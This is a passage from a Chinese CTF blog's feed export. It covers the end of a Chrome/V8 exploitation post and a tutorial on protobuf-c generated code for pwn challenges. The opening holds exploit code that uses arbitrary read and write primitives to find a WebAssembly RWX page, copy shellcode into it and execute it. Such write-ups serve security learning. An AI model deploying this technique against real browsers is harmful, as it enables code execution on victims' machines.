class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">42</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> pwn = wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> pwn_addr = address_of(pwn);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;pwn_addr =&gt; 0x&quot;</span> + pwn_addr.toString(<span class="number">16</span>).trim());</span><br><span class="line"><span class="keyword">var</span> shared_info_addr = arbitrary_read(pwn_addr - <span class="number">1n</span> + <span class="number">0x18n</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;shared_info_addr =&gt; 0x&quot;</span> + shared_info_addr.toString(<span class="number">16</span>).trim());</span><br><span class="line"><span class="keyword">var</span> data_addr = arbitrary_read(shared_info_addr - <span class="number">1n</span> + <span class="number">0x8n</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;data_addr =&gt; 0x&quot;</span> + data_addr.toString(<span class="number">16</span>).trim());</span><br><span class="line"><span class="keyword">var</span> instance_addr = arbitrary_read(data_addr - <span class="number">1n</span> + <span class="number">0x10n</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;instance_addr =&gt; 0x&quot;</span> + instance_addr.toString(<span class="number">16</span>).trim());</span><br><span class="line"><span class="keyword">var</span> rwx_addr = arbitrary_read(instance_addr - <span class="number">1n</span> + <span class="number">0x88n</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;rwx_addr =&gt; 0x&quot;</span> + rwx_addr.toString(<span class="number">16</span>).trim());</span><br><span class="line"></span><br><span class="line">arbitrary_write(rwx_addr, sc_arr);</span><br><span class="line"></span><br><span class="line">pwn();</span><br></pre></td></tr></table></figure><p><img   src="/images/image-20230627195354273.png"  alt="image-20230627195354273"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这段事情因为各种事情耽搁，一直没有更新文章。本打算新的一篇出&lt;code&gt;rootkit&lt;/code&gt;来水一篇，后面发现a3佬写的太多了，不想</summary>
      
    
    
    
    <category term="chrome-pwn" scheme="https://196082.github.io/categories/chrome-pwn/"/>
    
    
    <category term="overstep" scheme="https://196082.github.io/tags/overstep/"/>
    
  </entry>
  
  <entry>
    <title>关于protobuf的解题步骤</title>
    <link href="https://196082.github.io/2023/05/30/protobuf/"/>
    <id>https://196082.github.io/2023/05/30/protobuf/</id>
    <published>2023-05-30T08:26:30.000Z</published>
    <updated>2023-05-30T08:28:07.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>其实在以前已经多次遇见过<code>protobuf</code>了，但是都不太在意因为总感觉会像musl库一样，存活一段时间后就消失了。所以也导致我一直没有去真正做过这样的题，这次国赛第一天恰好出现了这样一道题，不出意外没能解出来，如果不看wp我可能还会怀疑自己的逆向能力，因为我蠢到看了几个小时的1200多行代码。最可恶的是当初不想玩web的一大原因就是我比较粗心大意，面对信息收集时往往会忽略掉重要信息，但是现在的pwn也越来越往这个方向靠了。不可否认的是，这提升了选手的综合实力(<del>恶心选手</del>)，只是我不太能接受从一个坑又跳到了另外一个坑里面去了。不过，需要认清现实的是我的逆向水平确实很差，我也准备开始刷逆向题了。</p><h2 id="protobuf"><a href="#protobuf" class="headerlink" title="protobuf"></a>protobuf</h2><h3 id="什么是protobuf"><a href="#什么是protobuf" class="headerlink" title="什么是protobuf"></a>什么是protobuf</h3><p>Protocol Buffers，是Google公司开发的一种数据描述语言，类似于XML能够将结构化数据序列化，可用于数据存储、通信协议等方面。它不依赖于语言和平台并且可扩展性极强。</p><p>同XML相比，Protocol buffers在序列化结构化数据方面有许多优点：</p><ol><li>更简单</li><li>数据描述文件只需原来的1&#x2F;10至1&#x2F;3</li><li>解析速度是原来的20倍至100倍</li><li>减少了二义性</li><li>生成了更容易在编程中使用的数据访问</li><li>支持多种编程语言<br> （转自百度百科）</li></ol><p>这里就不多提了，安装的话自己搜一下就有的。</p><h3 id="使用protobuf"><a href="#使用protobuf" class="headerlink" title="使用protobuf"></a>使用protobuf</h3><p>首先编写一个测试文件<code>test.proto</code></p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto2&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">message</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="keyword">required</span> <span class="built_in">int64</span> aaa = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">required</span> <span class="built_in">uint64</span> bbb = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">required</span> <span class="built_in">sint64</span> ccc = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">required</span> <span class="built_in">bytes</span> ddd = <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用<code>protoc --c_out=. ./test.proto</code>命令生成对应代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Generated by the protocol buffer compiler.  DO NOT EDIT! */</span></span><br><span class="line"><span class="comment">/* Generated from: test.proto */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> PROTOBUF_C_test_2eproto__INCLUDED</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROTOBUF_C_test_2eproto__INCLUDED</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;protobuf-c/protobuf-c.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">PROTOBUF_C__BEGIN_DECLS</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> PROTOBUF_C_VERSION_NUMBER &lt; 1000000</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">error</span> This file was generated by a newer version of protoc-c which is incompatible with your libprotobuf-c headers. Please update your headers.</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">elif</span> 1003003 &lt; PROTOBUF_C_MIN_COMPILER_VERSION</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">error</span> This file was generated by an older version of protoc-c which is incompatible with your libprotobuf-c headers. Please regenerate this file with a newer version of protoc-c.</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">Test</span> <span class="title">Test</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- enums --- */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- messages --- */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span>  _<span class="title">Test</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  ProtobufCMessage base;</span><br><span class="line">  <span class="keyword">int64_t</span> aaa;</span><br><span class="line">  <span class="keyword">uint64_t</span> bbb;</span><br><span class="line">  <span class="keyword">int64_t</span> ccc;</span><br><span class="line">  ProtobufCBinaryData ddd;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TEST__INIT \</span></span><br><span class="line"><span class="meta"> &#123; PROTOBUF_C_MESSAGE_INIT (&amp;test__descriptor) \</span></span><br><span class="line"><span class="meta">    , 0, 0, 0, &#123;0,NULL&#125; &#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Test methods */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span>   <span class="title">test__init</span></span></span><br><span class="line"><span class="function">                     <span class="params">(Test         *message)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">test__get_packed_size</span></span></span><br><span class="line"><span class="function">                     <span class="params">(<span class="keyword">const</span> Test   *message)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">test__pack</span></span></span><br><span class="line"><span class="function">                     <span class="params">(<span class="keyword">const</span> Test   *message,</span></span></span><br><span class="line"><span class="params"><span class="function">                      <span class="keyword">uint8_t</span>             *out)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">test__pack_to_buffer</span></span></span><br><span class="line"><span class="function">                     <span class="params">(<span class="keyword">const</span> Test   *message,</span></span></span><br><span class="line"><span class="params"><span class="function">                      ProtobufCBuffer     *buffer)</span></span>;</span><br><span class="line"><span class="function">Test *</span></span><br><span class="line"><span class="function">       <span class="title">test__unpack</span></span></span><br><span class="line"><span class="function">                     <span class="params">(ProtobufCAllocator  *allocator,</span></span></span><br><span class="line"><span class="params"><span class="function">                      <span class="keyword">size_t</span>               len,</span></span></span><br><span class="line"><span class="params"><span class="function">                      <span class="keyword">const</span> <span class="keyword">uint8_t</span>       *data)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span>   <span class="title">test__free_unpacked</span></span></span><br><span class="line"><span class="function">                     <span class="params">(Test *message,</span></span></span><br><span class="line"><span class="params"><span class="function">                      ProtobufCAllocator *allocator)</span></span>;</span><br><span class="line"><span class="comment">/* --- per-message closures --- */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*Test_Closure)</span></span></span><br><span class="line"><span class="function">                 <span class="params">(<span class="keyword">const</span> Test *message,</span></span></span><br><span class="line"><span class="params"><span class="function">                  <span class="keyword">void</span> *closure_data)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- services --- */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- descriptors --- */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">const</span> ProtobufCMessageDescriptor test__descriptor;</span><br><span class="line"></span><br><span class="line">PROTOBUF_C__END_DECLS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  <span class="comment">/* PROTOBUF_C_test_2eproto__INCLUDED */</span></span></span><br></pre></td></tr></table></figure><p>这是<code>test.pb-c.h</code>文件，可以看到其中定义了许多的函数，并且定义了结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Generated by the protocol buffer compiler.  DO NOT EDIT! */</span></span><br><span class="line"><span class="comment">/* Generated from: test.proto */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Do not generate deprecated warnings for self */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> PROTOBUF_C__NO_DEPRECATED</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROTOBUF_C__NO_DEPRECATED</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;test.pb-c.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span>   <span class="title">test__init</span></span></span><br><span class="line"><span class="function">                     <span class="params">(Test         *message)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">const</span> Test init_value = TEST__INIT;</span><br><span class="line">  *message = init_value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">test__get_packed_size</span></span></span><br><span class="line"><span class="function">                     <span class="params">(<span class="keyword">const</span> Test *message)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  assert(message-&gt;base.descriptor == &amp;test__descriptor);</span><br><span class="line">  <span class="keyword">return</span> protobuf_c_message_get_packed_size ((<span class="keyword">const</span> ProtobufCMessage*)(message));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">test__pack</span></span></span><br><span class="line"><span class="function">                     <span class="params">(<span class="keyword">const</span> Test *message,</span></span></span><br><span class="line"><span class="params"><span class="function">                      <span class="keyword">uint8_t</span>       *out)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  assert(message-&gt;base.descriptor == &amp;test__descriptor);</span><br><span class="line">  <span class="keyword">return</span> protobuf_c_message_pack ((<span class="keyword">const</span> ProtobufCMessage*)message, out);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">test__pack_to_buffer</span></span></span><br><span class="line"><span class="function">                     <span class="params">(<span class="keyword">const</span> Test *message,</span></span></span><br><span class="line"><span class="params"><span class="function">                      ProtobufCBuffer *buffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  assert(message-&gt;base.descriptor == &amp;test__descriptor);</span><br><span class="line">  <span class="keyword">return</span> protobuf_c_message_pack_to_buffer ((<span class="keyword">const</span> ProtobufCMessage*)message, buffer);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">Test *</span></span><br><span class="line"><span class="function">       <span class="title">test__unpack</span></span></span><br><span class="line"><span class="function">                     <span class="params">(ProtobufCAllocator  *allocator,</span></span></span><br><span class="line"><span class="params"><span class="function">                      <span class="keyword">size_t</span>               len,</span></span></span><br><span class="line"><span class="params"><span class="function">                      <span class="keyword">const</span> <span class="keyword">uint8_t</span>       *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (Test *)</span><br><span class="line">     protobuf_c_message_unpack (&amp;test__descriptor,</span><br><span class="line">                                allocator, len, data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span>   <span class="title">test__free_unpacked</span></span></span><br><span class="line"><span class="function">                     <span class="params">(Test *message,</span></span></span><br><span class="line"><span class="params"><span class="function">                      ProtobufCAllocator *allocator)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!message)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  assert(message-&gt;base.descriptor == &amp;test__descriptor);</span><br><span class="line">  protobuf_c_message_free_unpacked ((ProtobufCMessage*)message, allocator);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> ProtobufCFieldDescriptor test__field_descriptors[<span class="number">4</span>] =</span><br><span class="line">&#123;</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;aaa&quot;</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line">    PROTOBUF_C_TYPE_INT64,</span><br><span class="line">    <span class="number">0</span>,   <span class="comment">/* quantifier_offset */</span></span><br><span class="line">    offsetof(Test, aaa),</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>,             <span class="comment">/* flags */</span></span><br><span class="line">    <span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved1,reserved2, etc */</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;bbb&quot;</span>,</span><br><span class="line">    <span class="number">2</span>,</span><br><span class="line">    PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line">    PROTOBUF_C_TYPE_UINT64,</span><br><span class="line">    <span class="number">0</span>,   <span class="comment">/* quantifier_offset */</span></span><br><span class="line">    offsetof(Test, bbb),</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>,             <span class="comment">/* flags */</span></span><br><span class="line">    <span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved1,reserved2, etc */</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;ccc&quot;</span>,</span><br><span class="line">    <span class="number">3</span>,</span><br><span class="line">    PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line">    PROTOBUF_C_TYPE_SINT64,</span><br><span class="line">    <span class="number">0</span>,   <span class="comment">/* quantifier_offset */</span></span><br><span class="line">    offsetof(Test, ccc),</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>,             <span class="comment">/* flags */</span></span><br><span class="line">    <span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved1,reserved2, etc */</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;ddd&quot;</span>,</span><br><span class="line">    <span class="number">4</span>,</span><br><span class="line">    PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line">    PROTOBUF_C_TYPE_BYTES,</span><br><span class="line">    <span class="number">0</span>,   <span class="comment">/* quantifier_offset */</span></span><br><span class="line">    offsetof(Test, ddd),</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>,             <span class="comment">/* flags */</span></span><br><span class="line">    <span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved1,reserved2, etc */</span></span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">unsigned</span> test__field_indices_by_name[] = &#123;</span><br><span class="line">  <span class="number">0</span>,   <span class="comment">/* field[0] = aaa */</span></span><br><span class="line">  <span class="number">1</span>,   <span class="comment">/* field[1] = bbb */</span></span><br><span class="line">  <span class="number">2</span>,   <span class="comment">/* field[2] = ccc */</span></span><br><span class="line">  <span class="number">3</span>,   <span class="comment">/* field[3] = ddd */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> ProtobufCIntRange test__number_ranges[<span class="number">1</span> + <span class="number">1</span>] =</span><br><span class="line">&#123;</span><br><span class="line">  &#123; <span class="number">1</span>, <span class="number">0</span> &#125;,</span><br><span class="line">  &#123; <span class="number">0</span>, <span class="number">4</span> &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> ProtobufCMessageDescriptor test__descriptor =</span><br><span class="line">&#123;</span><br><span class="line">  PROTOBUF_C__MESSAGE_DESCRIPTOR_MAGIC,</span><br><span class="line">  <span class="string">&quot;test&quot;</span>,</span><br><span class="line">  <span class="string">&quot;Test&quot;</span>,</span><br><span class="line">  <span class="string">&quot;Test&quot;</span>,</span><br><span class="line">  <span class="string">&quot;&quot;</span>,</span><br><span class="line">  <span class="keyword">sizeof</span>(Test),</span><br><span class="line">  <span class="number">4</span>,</span><br><span class="line">  test__field_descriptors,</span><br><span class="line">  test__field_indices_by_name,</span><br><span class="line">  <span class="number">1</span>,  test__number_ranges,</span><br><span class="line">  (ProtobufCMessageInit) test__init,</span><br><span class="line">  <span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved[123] */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这个文件就是<code>test.pb-c.c</code>文件，内部对<code>test__field_descriptors</code>数组进行了复制，这里使用的结构体为<code>ProtobufCFieldDescriptor</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProtobufCFieldDescriptor</span> &#123;</span></span><br><span class="line"><span class="comment">/** Name of the field as given in the .proto file. */</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>*name;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Tag value of the field as given in the .proto file. */</span></span><br><span class="line"><span class="keyword">uint32_t</span>id;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Whether the field is `REQUIRED`, `OPTIONAL`, or `REPEATED`. */</span></span><br><span class="line">ProtobufCLabellabel;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The type of the field. */</span></span><br><span class="line">ProtobufCTypetype;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The offset in bytes of the message&#x27;s C structure&#x27;s quantifier field</span></span><br><span class="line"><span class="comment"> * (the `has_MEMBER` field for optional members or the `n_MEMBER` field</span></span><br><span class="line"><span class="comment"> * for repeated members or the case enum for oneofs).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span>quantifier_offset;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The offset in bytes into the message&#x27;s C structure for the member</span></span><br><span class="line"><span class="comment"> * itself.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span>offset;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A type-specific descriptor.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If `type` is `PROTOBUF_C_TYPE_ENUM`, then `descriptor` points to the</span></span><br><span class="line"><span class="comment"> * corresponding `ProtobufCEnumDescriptor`.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If `type` is `PROTOBUF_C_TYPE_MESSAGE`, then `descriptor` points to</span></span><br><span class="line"><span class="comment"> * the corresponding `ProtobufCMessageDescriptor`.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Otherwise this field is NULL.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">void</span>*descriptor; <span class="comment">/* for MESSAGE and ENUM types */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/** The default value for this field, if defined. May be NULL. */</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">void</span>*default_value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A flag word. Zero or more of the bits defined in the</span></span><br><span class="line"><span class="comment"> * `ProtobufCFieldFlag` enum may be set.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">uint32_t</span>flags;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="keyword">unsigned</span>reserved_flags;</span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="keyword">void</span>*reserved2;</span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="keyword">void</span>*reserved3;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>而这个结构体中的type就是数据的类型，需要注意的是，我们在<code>proto</code>文件中，分别定义了<code>int64</code>和<code>sint64</code>虽然结构体中都被翻译成了<code>int64_t</code>类型，但是可以在<code>test.pb-c.c</code>文件中看到，他们在上述结构体中的type值是不一样的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 